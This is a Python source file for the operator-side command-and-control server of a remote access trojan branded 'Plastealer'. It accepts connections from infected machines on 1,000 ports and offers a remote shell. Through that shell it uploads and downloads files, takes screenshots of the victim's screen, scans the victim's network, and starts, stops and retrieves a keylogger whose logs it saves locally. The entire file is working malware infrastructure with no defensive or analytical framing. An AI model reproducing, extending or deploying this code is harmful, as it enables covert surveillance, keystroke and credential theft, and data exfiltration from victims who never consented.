import socket
from threading import Thread
import os
import time

chunk_size = 65536
eof = "<end_of_file>"
end_result = "<end_of_result>"
threads = []
clients = []

def listen_for_bots(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", port))
        sock.listen()
        bot, bot_address = sock.accept()
        clients.append(bot)
    except Exception as e:
        print(f"[-] Error on port {port}: {e}")

def main():
    print("[*] Server bot waiting for incoming connections..........")
    startig_port = 5555
    bots = 1000
    for i in range(bots):
        t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)
        threads.append(t)
        t.start()

    run_cnc = True
    while run_cnc:
        if len(clients) != 0:
            for i, c in enumerate(clients):
                peer_info = str(c.getpeername()).replace(",", ":")
                print(f"\t\t {i} \t {peer_info}")
            selected_client = int(input("[*] Select client by index: "))
            bot = clients[selected_client]
            run_bot = True
            while run_bot:
                print("""           
                            ██████  ██       █████  ███████ ████████ ███████  █████  ██      ███████ ██████  
                            ██   ██ ██      ██   ██ ██         ██    ██      ██   ██ ██      ██      ██   ██ 
                            ██████  ██      ███████ ███████    ██    █████   ███████ ██      █████   ██████  
                            ██      ██      ██   ██      ██    ██    ██      ██   ██ ██      ██      ██   ██ 
                            ██      ███████ ██   ██ ███████    ██    ███████ ██   ██ ███████ ███████ ██   ██ V1.0
                            """)
                while True:
                    command = input("Plastealer shell > ")
                    if command.startswith("upload"):
                        try:
                            upload_file_name = os.path.basename(command[6:].strip())
                            current_dir = os.path.dirname(os.path.abspath(__file__))
                            file_to_upload = os.path.join(current_dir, upload_file_name)
                            if os.path.exists(file_to_upload) and os.path.isfile(file_to_upload):
                                file_size = os.path.getsize(file_to_upload)
                                bot.sendall(f"upload|{file_size}|{upload_file_name}".encode())
                                answer = bot.recv(1024).decode()
                                if answer == "yes":
                                    print(f"[+] Uploading File...... : {upload_file_name} (Size: {file_size} bytes)")
                                    sent = 0
                                    with open(file_to_upload, "rb") as file:
                                        while True:
                                            chunk = file.read(chunk_size)
                                            if not chunk:
                                                break
                                            bot.sendall(chunk)
                                            sent += len(chunk)
                                            percent = (sent / file_size) * 100
                                            print(f"\r[+] Progress: {percent:.2f}%", end="", flush=True)
                                    print("\n[+] File sent successfully")
                                    client_save_path = bot.recv(1024).decode()
                                    if client_save_path == "ERROR":
                                        print("[-] Client failed to save the file.")
                                    else:
                                        print(f"[+] Successfully uploaded the file to: {client_save_path}")
                                else:
                                    print(f"[-] Client rejected: {answer}")
                            else:
                                print(f"[-] File '{upload_file_name}' doesn't exist in server directory.")
                        except Exception as e:
                            print(f"[-] Error during upload: {e}")
                        continue
                    bot.send(command.encode())
                    if command.lower() == "exit":
                        run_bot = False
                        break
                    elif command == "":
                        continue
                    elif len(command) == 2 and command[0].isalpha() and command[1] == ":":
                        continue
                    elif command.startswith("cd"):
                        continue

                    # ---------------------------downloaded commands-----------------
                    elif command.startswith("download"):
                        raw_path = command[8:].strip()
                        file_name = os.path.basename(raw_path.replace('\\', '/'))
                        current_dir = os.path.dirname(os.path.abspath(__file__))
                        save_path = os.path.join(current_dir, file_name)
                        response = bot.recv(1024).decode().strip()
                        if response.startswith("yes|"):
                            try:
                                _, file_size_str, download_file_name = response.split('|')
                                file_size = int(file_size_str)
                                print(f"[+] Downloading File...... : {download_file_name} (Size: {file_size} bytes)")
                                received = 0
                                with open(save_path, "wb") as download_file:
                                    while received < file_size:
                                        bytes_to_receive = min(chunk_size, file_size - received)
                                        chunk = bot.recv(bytes_to_receive)
                                        if not chunk:
                                            break
                                        download_file.write(chunk)
                                        received += len(chunk)
                                        percent = (received / file_size) * 100
                                        print(f"\r[+] Progress: {percent:.2f}%", end="", flush=True)
                                print("\n[+] File received successfully")
                                print(f"[+] Successfully downloaded the file to: {save_path}")
                            except Exception as e:
                                print(f"\n[-] Error during download: {e}")
                        else:
                            print("[-] File doesn't exist on client")

                    # ---------------------------screenshot commands-----------------
                    elif command == "screenshot":
                        print("[+] taking screenshot....")
                        try:
                            header = bot.recv(1024).decode().strip()
                            file_size_str, file_name = header.split('|')
                            file_size = int(file_size_str)
                            if file_size == 0:
                                print("[-] Client failed to capture screenshot.")
                                continue
                            print(f"[+] Receiving file: {file_name}")
                            bot.send("yes".encode())
                            current_dir = os.path.dirname(os.path.abspath(__file__))
                            save_path = os.path.join(current_dir, file_name)
                            received = 0
                            with open(save_path, "wb") as download_file:
                                print("[+] Downloading Screenshot.....")
                                while received < file_size:
                                    bytes_to_receive = min(chunk_size, file_size - received)
                                    chunk = bot.recv(bytes_to_receive)
                                    if not chunk:
                                        print("\n[-] Connection closed prematurely.")
                                        break
                                    download_file.write(chunk)
                                    received += len(chunk)
                                    percent = (received / file_size) * 100
                                    print(f"\r[+] Progress: {percent:.2f}%", end="", flush=True)
                            if received == file_size:
                                print(f"\n[+] Screenshot Downloaded successfully and saved to: {save_path}")
                                bot.send("received".encode())
                            else:
                                print("\n[-] Download incomplete.")
                        except Exception as e:
                            print(f"[-] Error receiving screenshot: {e}")

                    # -------------------network scanner command------------------------
                    elif command.startswith("netscan"):
                        full_result = b""
                        while True:
                            chunk = bot.recv(1024)
                            if not chunk: break
                            full_result += chunk
                            if end_result.encode() in full_result:
                                output = full_result.split(end_result.encode())[0]
                                # تم إصلاح خطأ decode
                                print(output.decode(errors="ignore"))
                                break

                    # ----------------- keylogger start / stop -----------------
                    elif command in ("start keylog", "stop keylog"):
                        full_result = b""
                        while True:
                            chunk = bot.recv(1024)
                            if not chunk: break
                            full_result += chunk
                            if end_result.encode() in full_result:
                                output = full_result.split(end_result.encode())[0]
                                print(output.decode(errors="ignore"))
                                break

                    # -----------------keylogger download -----------------
                    elif command == "get keylog":
                        exists = bot.recv(1024)
                        if exists.decode().strip() == "yes":
                            current_dir = os.path.dirname(os.path.abspath(__file__))
                            save_name = "keylog.txt"
                            save_path = os.path.join(current_dir, save_name)
                            counter = 1
                            while os.path.exists(save_path):
                                save_name = f"keylog_{counter}.txt"
                                save_path = os.path.join(current_dir, save_name)
                                counter += 1
                            with open(save_path, "wb") as download_file:
                                print("[+] Downloading keylog file.....")
                                buffer = b""
                                while True:
                                    chunk = bot.recv(chunk_size)
                                    if not chunk: break
                                    buffer += chunk
                                    if eof.encode() in buffer:
                                        file_data = buffer.split(eof.encode())[0]
                                        download_file.write(file_data)
                                        break
                                    else:
                                        download_file.write(buffer)
                                        buffer = b""
                            print(f"[+] Successfully downloaded the keylogger file to: {save_path}")
                            bot.send(b"received")
                        else:
                            print("[-] Log file doesn't exist")
                    else:
                        full_result = b""
                        while True:
                            chunk = bot.recv(1024)
                            if not chunk: break
                            full_result += chunk
                            if end_result.encode() in full_result:
                                output = full_result.split(end_result.encode())[0]
                                print(output.decode(errors="ignore"))
                                break

        else:
            print("[*] Waiting for clients to connect........", end="\r")
            time.sleep(2)
            run_cnc = True

if __name__ == "__main__":
    main()